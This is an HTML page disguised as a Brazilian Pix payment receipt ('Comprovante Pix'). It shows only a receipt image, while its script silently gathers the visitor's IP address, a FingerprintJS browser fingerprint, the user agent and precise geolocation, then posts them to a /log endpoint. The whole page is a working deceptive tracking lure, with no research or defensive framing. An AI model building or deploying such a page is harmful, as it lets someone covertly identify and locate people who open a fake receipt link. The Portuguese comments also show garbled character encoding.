<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Comprovante Pix</title>
  <style>
    body { background: #f2f2f2; text-align: center; font-family: Arial; }
    img { margin-top: 50px; width: 90%; max-width: 500px; }
  </style>
</head>
<body>
  <img src="comprovante.jpg" alt="Comprovante Pix">

  <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>

  <script>
    fetch("https://api.ipify.org?format=json")
      .then(res => res.json())
      .then(ipData => {
        const ip = ipData.ip;
        const userAgent = navigator.userAgent;

        const sendData = (lat, lon, visitorId) => {
          const loc = lat && lon ? `${lat},${lon}` : undefined;
          console.log("üì° ENVIANDO:", {
            ip,
            visitorId,
            userAgent,
            device: userAgent,
            loc
          });

          fetch("/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              ip,
              visitorId,
              userAgent,
              device: userAgent,
              loc
            })
          })
          .then(r => r.ok ? console.log("‚úÖ Dados enviados com sucesso") : console.warn("‚ö†Ô∏è Falha no envio:", r.status))
          .catch(err => console.error("‚ùå Erro ao enviar:", err));
        };

        FingerprintJS.load()
          .then(fp => fp.get())
          .then(result => {
            const visitorId = result.visitorId;

            if (navigator.geolocation) {
              // Verifica estado da permiss√£o (debug √∫til)
              navigator.permissions?.query({ name: 'geolocation' }).then(status => {
                console.log("üîç Permiss√£o geolocaliza√ß√£o:", status.state);
              });

              navigator.geolocation.getCurrentPosition(
                pos => {
                  const lat = pos.coords.latitude;
                  const lon = pos.coords.longitude;
                  console.log("üìç Localiza√ß√£o precisa:", lat, lon);
                  sendData(lat, lon, visitorId);
                },
                err => {
                  console.warn("‚ö†Ô∏è Sem geolocaliza√ß√£o:", err.message);
                  sendData(null, null, visitorId);
                },
                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
              );
            } else {
              console.log("‚ùå Geolocaliza√ß√£o n√£o suportada");
              sendData(null, null, visitorId);
            }
          });
      });
  </script>
</body>
</html>
